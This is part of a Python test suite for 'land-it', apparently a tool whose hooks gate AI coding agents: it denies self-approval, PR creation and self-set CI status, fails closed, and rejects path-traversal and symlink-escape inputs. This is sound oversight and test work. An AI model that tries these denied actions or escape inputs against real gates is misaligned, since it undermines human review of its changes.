        r.cli("eval", "add", "--commit", bad, "--file", "a.py", "--line", "1", "--summary", "x")
        r.cli("eval", "run", "--reviewer", "echo a.py:1")
        self.assertEqual(os.listdir(outside), [], "nothing written outside the checkout")

    def test_r10_overlay_refuses_a_symlinked_parent_directory(self):
        wt, outside = tempfile.mkdtemp(), tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, wt)
        self.addCleanup(shutil.rmtree, outside)
        os.symlink(outside, os.path.join(wt, "d"))
        self.assertFalse(LI.overlay(wt, "d/REVIEW.md", __file__))
        self.assertEqual(os.listdir(outside), [])
        self.assertTrue(LI.overlay(wt, "REVIEW.md", __file__))

    def test_e07_eval_ids_and_lines_are_validated(self):
        r = Repo(self, {})
        r.write("a.py", "x = 2\n")
        r.commit("second")
        for args in (["--id", "../../escape", "--clean"], ["--file", "a.py", "--line", "0", "--summary", "s"],
                     ["--file", "a.py", "--line", "9-3", "--summary", "s"]):
            out = r.cli("eval", "add", "--commit", "HEAD", *args)
            self.assertNotEqual(out.returncode, 0, args)
            self.assertNotIn("Traceback", out.stderr)
        self.assertFalse(any(f.endswith("escape.json") for _, _, fs in os.walk(os.path.dirname(r.root)) for f in fs))

    def test_r06_repo_flag_doesnt_slip_past_the_gates(self):
        r = Repo(self, {"checks": {"ok": "true"}})
        decision = lambda cmd: r.hook("pre-bash", tool_input={"command": cmd})["hookSpecificOutput"]["permissionDecision"]
        self.assertEqual(decision("gh -R owner/repo pr create --fill"), "deny")
        self.assertEqual(decision("gh --repo=owner/repo pr merge 3"), "ask")
        self.assertEqual(decision("gh --repo owner/repo pr review 3 --approve"), "deny")

    def test_r15_policy_hook_fails_closed(self):
        with open(os.path.join(os.path.dirname(os.path.dirname(BIN)), "hooks", "hooks.json")) as f:
            pre = json.load(f)["hooks"]["PreToolUse"][0]["hooks"][0]
        self.assertEqual(pre.get("onFailure"), "block")



class Guarantees(unittest.TestCase):
    """0.7.0: the stamp means what the README says. Reproductions from the audit, one per finding."""

    def test_r01_r02_no_stamp_without_the_tiers_review_stages(self):
        r = Repo(self, {"checks": {"ok": "true"}})
        branch(r)
        r.write("src/a.py", "x\n")
        r.cli("check")
        out = r.cli("stamp")
        self.assertIn("code, security", out.stderr, "green checks alone don't make a reviewed change")
        r.cli("round")
        self.assertNotEqual(r.cli("stage", "security", "--status", "skipped").returncode, 0, "skipping needs a reason")
        r.cli("stage", "code", "--status", "completed")
        r.cli("stage", "security", "--status", "skipped", "--reason", "no input handling")
        self.assertIn("security", r.cli("stamp").stderr, "a required stage must have run")
        r.cli("stage", "security", "--status", "completed")
        self.assertEqual(r.cli("stamp").returncode, 0)

    def test_verify_may_be_not_run_with_a_reason(self):
        r = Repo(self, {"checks": {"ok": "true"}, "risk": {"high": ["src/**"]}})
        branch(r)
        r.write("src/a.py", "x\n")
        r.cli("check")
        r.review("code", "security")
        r.cli("stage", "verify", "--status", "not_run", "--reason", "library, nothing to launch")
        self.assertEqual(r.cli("stamp").returncode, 0)

    def test_r03_a_red_run_clears_green_and_the_stamp(self):
        r = Repo(self, {"checks": {"t": "test ! -f .git/FAIL"}})
        r.cli("check")
        r.review()
        self.assertEqual(r.cli("stamp").returncode, 0)
        open(os.path.join(r.root, ".git/FAIL"), "w").close()
        self.assertEqual(r.cli("check").returncode, 1)
        self.assertNotEqual(r.cli("stamp").returncode, 0, "same tree, but its last check failed")
        self.assertEqual(r.pr_create(), "deny", "the earlier stamp went with it")

    def test_r04_checks_that_change_the_tree_dont_vouch_for_it(self):
        r = Repo(self, {"checks": {"fmt": "echo 'x = 9' > a.py"}})
        out = r.cli("check")
        self.assertEqual(out.returncode, 1)
        self.assertIn("changed files", out.stdout)
        self.assertFalse(json.loads(r.cli("status").stdout)["checks_green_for_worktree"])
        self.assertEqual(r.cli("check").returncode, 0, "stable on the second run")

    def test_r07_unknown_base_is_an_error_not_a_low_risk_diff(self):
        r = Repo(self, {"risk": {"high": ["src/auth/**"]}})
        sh(r.root, "git", "branch", "-m", "trunk")
        branch(r)
        r.write("src/auth/key.py", "k\n")
        r.commit("auth")
        out = r.cli("risk")
        self.assertNotEqual(out.returncode, 0)
        self.assertIn('set "base"', out.stderr)
        self.assertNotEqual(r.cli("stamp").returncode, 0)
        r.write(".claude/land-it.json", json.dumps({"risk": {"high": ["src/auth/**"]}, "base": "trunk"}))
        self.assertEqual(json.loads(r.cli("risk").stdout)["tier"], "high")

    def test_r08_renames_and_unicode_keep_their_risk(self):
        r = Repo(self, {"risk": {"high": ["src/auth/**"]}})
        r.write("src/auth/access.py", "a\n")
        r.commit("auth")
        branch(r)
        os.makedirs(os.path.join(r.root, "docs"))
        sh(r.root, "git", "mv", "src/auth/access.py", "docs/access.md")
        r.commit("move it to docs")
        out = json.loads(r.cli("risk").stdout)
        self.assertEqual(out["tier"], "high", "moving a file out of a high-risk area is a high-risk change")
        r.write("src/auth/пароль.py", "p\n")
        self.assertEqual(json.loads(r.cli("risk").stdout)["files"].get("src/auth/пароль.py"), "high")

    def test_a_broken_config_is_a_clear_error(self):
        r = Repo(self, {})
        r.write(".claude/land-it.json", '{"checks": {"t": "true"')
        out = r.cli("risk")
        self.assertIn("isn't valid JSON", out.stderr)
        self.assertNotIn("Traceback", out.stderr)

    def test_e03_an_edited_case_is_a_new_baseline(self):
        r = Repo(self, {})
        r.write("a.py", "x = 1\ny = None\n")
        r.commit("bug")
        bug = sh(r.root, "git", "rev-parse", "HEAD").strip()
        r.cli("eval", "add", "--commit", bug, "--file", "a.py", "--line", "2", "--summary", "y is None", "--id", "c1")
        self.assertIn("baseline", r.cli("eval", "run", "--reviewer", "echo a.py:2").stdout)
        r.cli("eval", "add", "--commit", bug, "--file", "a.py", "--line", "1", "--summary", "x too", "--id", "c1")
        self.assertIn("case set changed", r.cli("eval", "run", "--reviewer", "echo a.py:2").stdout)



FAKE_GH_CI = """#!/usr/bin/env python3
import json, os, sys
args = sys.argv[1:]
with open(os.environ["GH_LOG"], "a") as f:
    f.write(json.dumps(args) + "\\n")
store = os.environ["GH_STORE"]
bodies = open(store).read().split("\\x1e") if os.path.exists(store) else []
if "--paginate" in args:
    print("\\n".join(b for b in bodies if b))
elif any(a.startswith("body=") for a in args):
    if any(a.startswith("commit_id=") for a in args) and os.environ.get("REJECT_INLINE"):
        sys.exit("HTTP 422: pull_request_review_thread.line must be part of the diff")
    with open(store, "a") as f:
        f.write(next(a for a in args if a.startswith("body="))[5:] + "\\x1e")
"""


class CIVerdict(unittest.TestCase):
    def setUp(self):
        self.r = r = Repo(self, {})
        base = sh(r.root, "git", "rev-parse", "HEAD").strip()
        branch(r)
        r.write("src/a.py", "x = 1\n")
        r.commit("change")
        fake = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, fake)
        with open(os.path.join(fake, "gh"), "w") as f:
            f.write(FAKE_GH_CI)
        os.chmod(os.path.join(fake, "gh"), 0o755)
        self.log = os.path.join(fake, "log")
        self.env = {"PATH": fake + os.pathsep + os.environ["PATH"], "GH_LOG": self.log,
                    "GH_STORE": os.path.join(fake, "store"), "LAND_IT_BASE": base}

    def verdict(self, *extra, **env):
        out = self.r.cli("ci-verdict", "--sha", "abc123", "--pr", "7", *extra, env=dict(self.env, **env))
        return out.returncode, json.loads(out.stdout)

    def statuses(self):
        with open(self.log) as f:
            calls = [json.loads(ln) for ln in f]
        return [dict(a.split("=", 1) for a in c if a.startswith(("state=", "context="))) for c in calls
                if any(a.startswith("state=") for a in c)]

    def reviewed(self):
        self.r.cli("round", env=self.env)
        for kind in ("code", "security"):
            self.r.cli("stage", kind, "--status", "completed", env=self.env)

    def test_error_until_the_review_completes(self):
        code, out = self.verdict()
        self.assertEqual((code, out["state"], out["tier"]), (2, "error", "medium"), "the job ran, the review didn't")
        self.assertEqual(self.statuses()[-1], {"state": "error", "context": "land-it/review"})
        self.r.cli("round", env=self.env)
        self.r.cli("stage", "code", "--status", "completed", env=self.env)
        self.assertIn("security", self.verdict()[1]["description"], "a medium-tier change needs both stages")

    def test_failure_while_an_important_finding_is_open_and_no_reposts(self):
        self.reviewed()
        self.r.cli("findings", "add", stdin=json.dumps([{"file": "src/a.py", "line": 1, "summary": "x is wrong"}]),
                   env=self.env)
        code, out = self.verdict()
        self.assertEqual((code, out["state"], out["posted"]), (1, "failure", 1))
        self.assertEqual(self.verdict()[1]["posted"], 0, "the next push doesn't post it again")
        self.r.cli("findings", "resolve", "F1", "--status", "fixed", env=self.env)
        self.assertEqual(self.verdict()[:1] + (self.statuses()[-1]["state"],), (0, "success"))

    def test_findings_github_cant_anchor_go_in_one_summary(self):
        self.reviewed()
        self.r.cli("findings", "add", stdin=json.dumps([{"file": "src/a.py", "line": 1, "summary": "a"},
                                                         {"file": "src/b.py", "summary": "no line"}]), env=self.env)
        self.verdict(REJECT_INLINE="1")
        with open(self.env["GH_STORE"]) as f:
            bodies = [b for b in f.read().split("\x1e") if b]
        self.assertEqual(len(bodies), 1)
        self.assertIn("outside the diff", bodies[0])

    def test_claude_cant_set_the_status_itself(self):
        out = self.r.hook("pre-bash", tool_input={"command": "land-it ci-verdict --sha abc --pr 7"})
        self.assertEqual(out["hookSpecificOutput"]["permissionDecision"], "deny")

    def test_dry_run_sets_no_status(self):
        self.reviewed()
        code, out = self.verdict("--dry-run")
        self.assertEqual((code, out["state"]), (0, "success"))
        self.assertEqual(self.statuses(), [])



class Config(unittest.TestCase):
    def test_the_provider_neutral_path_and_migration(self):
        r = Repo(self, {"checks": {"ok": "true"}})
        self.assertEqual(json.loads(r.cli("config").stdout)["path"], ".claude/land-it.json")
        out = json.loads(r.cli("config", "migrate").stdout)
        self.assertEqual((out["path"], out["migrated"]), (".land-it/config.json", True))
        self.assertTrue(json.loads(r.cli("status").stdout)["commands_trusted"], "trust carries over")
        r.write(".claude/land-it.json", "{}")
        out = r.cli("risk")
        self.assertIn("both .land-it/config.json and .claude/land-it.json", out.stderr)

    def test_typos_and_wrong_types_are_caught(self):
        r = Repo(self, {})
        for cfg, expect in (({"chekcs": {}}, "did you mean 'checks'"),
                            ({"checks": {"t": "true"}, "stop_checks": ["test"]}, "'test', which isn't a check"),
                            ({"review_effort": {"high": "huge"}}, "review_effort.high"),
                            ({"risk": {"severe": ["x"]}}, "keyed by tier"),
                            ({"checks": {"t": {"cmd": "true"}}}, "checks.t"),
                            ({"circuit_breaker": {"mode": "panic"}}, "circuit_breaker"),
                            ({"max_rounds": 0}, "max_rounds")):
            r.write(".claude/land-it.json", json.dumps(cfg))
            out = r.cli("risk")
            self.assertNotEqual(out.returncode, 0, cfg)
            self.assertIn(expect, out.stderr, cfg)

    def test_agent_instruction_files_are_never_low(self):
        for path in ("AGENTS.md", "docs/AGENTS.md", ".codex/hooks.json", ".mcp.json", ".land-it/config.json"):
            self.assertNotEqual(LI.file_tier(path, {}), "low", path)
        self.assertEqual(LI.file_tier(".land-it/config.json", {}), "high")


class Doctor(unittest.TestCase):
    def doctor(self, r):
        out = r.cli("doctor")
        return out.returncode, {ln.split()[1] if len(ln.split()) > 1 else "": ln.split()[0]
                                for ln in out.stdout.splitlines() if ln.strip()}, out.stdout

    def test_a_working_setup(self):
        r = Repo(self, {"checks": {"ok": "true"}})
        code, rows, text = self.doctor(r)
        self.assertEqual(code, 0, text)
        self.assertEqual(rows.get("commands"), "ok")
        self.assertEqual(rows.get("base"), "ok")
        self.assertIn("old location", text, "points at the provider-neutral path")

    def test_what_blocks(self):
        r = Repo(self, {"checks": {"ok": "true"}}, trust=False)
        self.assertEqual(self.doctor(r)[1].get("commands"), "warn")
        r.write(".claude/land-it.json", '{"stop_cheks": []}')
        code, _, text = self.doctor(r)
        self.assertEqual(code, 1)
        self.assertIn("did you mean 'stop_checks'", text)
        os.remove(os.path.join(r.root, ".claude/land-it.json"))
        self.assertIn("run /land-it:init", self.doctor(r)[2])


PATCH = """*** Begin Patch
*** Update File: src/a.py
@@
-x = 1
+x = 2
*** Add File: src/new.py
+print("hi")
*** Update File: old/name.py
*** Move to: src/moved.py
*** End Patch"""


class CodexRuntime(unittest.TestCase):
    """The hook payloads and outputs documented for Codex: same fields, different edges."""

    def test_apply_patch_files_get_on_edit_and_the_stop_gate(self):
        r = Repo(self, {"checks": {"t": "false"}, "on_edit": {"*.py": "grep -q print {file}"}})
        for path in ("src/a.py", "src/new.py", "src/moved.py"):
            r.write(path, "x = 2\n")
        out = r.hook("post-edit", runtime="codex", tool_name="apply_patch", tool_input={"command": PATCH})
        self.assertEqual(out["decision"], "block", "on_edit ran on the patch's files")
        for path in ("src/a.py", "src/moved.py"):
            self.assertIn(path, out["reason"])
        self.assertEqual(r.hook("stop", runtime="codex")["decision"], "block")

    def test_ask_becomes_deny_and_messages_fit_codex(self):
        r = Repo(self, {"checks": {"ok": "true"}})
        out = r.hook("pre-bash", runtime="codex", tool_input={"command": "gh pr merge 3"})
        self.assertEqual(out["hookSpecificOutput"]["permissionDecision"], "deny")
        self.assertIn("run it yourself", out["hookSpecificOutput"]["permissionDecisionReason"])
        r.hook("prompt", runtime="codex", prompt="go")
        r.write("a.py", "x = 5\n")
        self.assertIsNone(r.hook("stop", runtime="codex"), "green: Codex gets no systemMessage")

    def test_typing_land_it_trust_is_the_codex_trust_signal(self):
        r = Repo(self, {"checks": {"t": "true"}}, trust=False)
        self.assertIsNone(r.hook("prompt", runtime="codex", prompt="please trust land-it"))
        self.assertFalse(json.loads(r.cli("status").stdout)["commands_trusted"], "only the exact command counts")
        out = r.hook("prompt", runtime="codex", prompt="land-it trust")
        self.assertEqual(out["decision"], "block", "the model never sees the trust prompt")
        self.assertIn("check t: true", out["reason"])
        self.assertTrue(json.loads(r.cli("status").stdout)["commands_trusted"])
        self.assertIsNone(Repo(self, {"checks": {"t": "true"}}, trust=False).hook("prompt", prompt="land-it trust"),
                          "in Claude Code a plain prompt isn't the trust signal; /land-it:trust is")

    def test_hooks_stay_out_of_land_its_own_nested_reviewer(self):
        r = Repo(self, {"checks": {"ok": "true"}})
        out = r.cli("hook", "pre-bash", stdin=json.dumps({"cwd": r.root, "tool_input": {"command": "gh pr create"}}),
                    env={"LAND_IT_HOOKS_OFF": "1"})
        self.assertEqual((out.returncode, out.stdout), (0, ""))



FAKE_REVIEWERS = {
    # both read the findings to return from FAKE_FINDINGS (JSON) and log their argv to FAKE_LOG
    "claude": """#!/usr/bin/env python3
import json, os, sys
open(os.environ["FAKE_LOG"], "a").write(json.dumps(sys.argv[1:]) + "\\n")
if os.environ.get("FAKE_FAIL"):
    sys.exit("model overloaded")
print(json.dumps({"is_error": False, "structured_output": json.loads(os.environ["FAKE_FINDINGS"])}))
""",
    "codex": """#!/usr/bin/env python3
import json, os, sys
args = sys.argv[1:]
open(os.environ["FAKE_LOG"], "a").write(json.dumps(args) + "\\n")
if os.environ.get("FAKE_FAIL"):
    sys.exit("model overloaded")
open(args[args.index("-o") + 1], "w").write(os.environ["FAKE_FINDINGS"])
""",
}
BUG = {"file": "calc.py", "line": 3, "summary": "median is wrong for even lengths", "severity": "important",
       "evidence": "return xs[len(xs) // 2]"}


class StructuredReview(unittest.TestCase):
    def setUp(self):
        self.r = r = Repo(self, {})
        branch(r)
        r.write("calc.py", "def median(xs):\n    xs = sorted(xs)\n    return xs[len(xs) // 2]\n")
        r.commit("median")
        fake = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, fake)
        for name, body in FAKE_REVIEWERS.items():
            with open(os.path.join(fake, name), "w") as f:
                f.write(body)
            os.chmod(os.path.join(fake, name), 0o755)
        self.log = os.path.join(fake, "log")
        self.env = {"PATH": fake + os.pathsep + os.environ["PATH"], "FAKE_LOG": self.log,
                    "FAKE_FINDINGS": json.dumps({"findings": [BUG]})}

    def review(self, *args, **env):
        out = self.r.cli("review", *args, env=dict(self.env, **env))
        return out.returncode, json.loads(out.stdout) if out.stdout.strip().startswith("{") else out.stderr

    def stages(self):
        return json.loads(self.r.cli("round").stdout)["stages"]

    def test_findings_and_the_stage_are_recorded_from_checked_json(self):
        self.r.cli("round")
        for runner in ("claude", "codex"):
            code, out = self.review("--runner", runner)
            self.assertEqual((code, out["stage"]), (0, "completed"), runner)
        self.assertEqual(self.stages()["code"]["runner"], "codex")
        findings = json.loads(self.r.cli("findings").stdout)["findings"]
        self.assertEqual([(f["file"], f["line"], f["introduced"]) for f in findings], [("calc.py", 3, "this-change")],
                         "the second runner's identical finding isn't recorded twice")
        with open(self.log) as f:
            calls = [json.loads(ln) for ln in f]
        self.assertIn("--json-schema", calls[0])
        self.assertEqual(calls[1][:2], ["exec", "--output-schema"])
        self.assertIn("git diff", calls[1][-1], "the prompt names the diff to review")

    def test_a_failed_or_malformed_review_records_nothing(self):
        self.r.cli("round")
        for env in ({"FAKE_FAIL": "1"}, {"FAKE_FINDINGS": '{"findings": [{"file": "calc.py", "line": 0}]}'},
                    {"FAKE_FINDINGS": "not json"}):
            code, out = self.review("--runner", "codex", **env)
            self.assertEqual((code, out["stage"]), (2, "not recorded"), env)
        self.assertEqual(self.stages(), {})
        self.assertEqual(json.loads(self.r.cli("findings").stdout)["findings"], [])

    def test_needs_a_round_but_path_mode_doesnt(self):
        code, err = self.review()
        self.assertIn("run `land-it round` first", err)
        code, out = self.review("--path", "calc.py", "--runner", "codex")
        self.assertEqual((code, out["findings"]), (0, [BUG]))

    def test_eval_scores_structured_findings(self):
        bug = sh(self.r.root, "git", "rev-parse", "HEAD").strip()
        self.r.cli("eval", "add", "--commit", bug, "--file", "calc.py", "--line", "3", "--summary", "even lengths")
        out = self.r.cli("eval", "run", "--structured", "codex", env=self.env)
        self.assertEqual(out.returncode, 0, out.stderr)
        self.assertIn("caught 1/1, 1 finding(s)", out.stdout)
        with open(os.path.join(self.r.root, LI.EVAL_DIR, "history.jsonl")) as f:
            self.assertTrue(json.loads(f.readline())["scorer"].startswith("structured:codex:"))


class CodexPackage(unittest.TestCase):
    ROOT = os.path.dirname(os.path.dirname(os.path.abspath(BIN)))

    def load(self, rel):
        with open(os.path.join(self.ROOT, rel)) as f:
            return json.load(f)

    def test_manifests_agree_and_hooks_point_at_real_events(self):
        codex, claude = self.load("plugin.json"), self.load(".claude-plugin/plugin.json")
        self.assertEqual((codex["name"], codex["version"]), (claude["name"], claude["version"]))
        hooks_file = codex["extensions"]["com.openai"]["hooks"]
        self.assertTrue(hooks_file.startswith("./"))
        for event, groups in self.load(hooks_file)["hooks"].items():
            for g in groups:
                for h in g["hooks"]:
                    name = re.search(r"hook (\S+) --runtime codex", h["command"]).group(1)
                    self.assertEqual(LI.EVENTS[name], event)
                    self.assertIn("${PLUGIN_ROOT}/bin/land-it", h["command"])
        entry = self.load(".agents/plugins/marketplace.json")["plugins"][0]
        self.assertEqual((entry["name"], entry["source"]["path"]), ("land-it", "./"))

    def test_session_start_tells_codex_where_the_cli_is(self):
        r = Repo(self, None)
        out = r.cli("hook", "session", "--runtime", "codex", stdin=json.dumps({"cwd": r.root}),
                    env={"PLUGIN_ROOT": "/opt/land-it", "CLAUDE_PLUGIN_ROOT": ""})
        ctx = json.loads(out.stdout)["hookSpecificOutput"]["additionalContext"]
        self.assertIn("python3 /opt/land-it/bin/land-it", ctx, "even before /land-it:init")


if __name__ == "__main__":
    unittest.main()
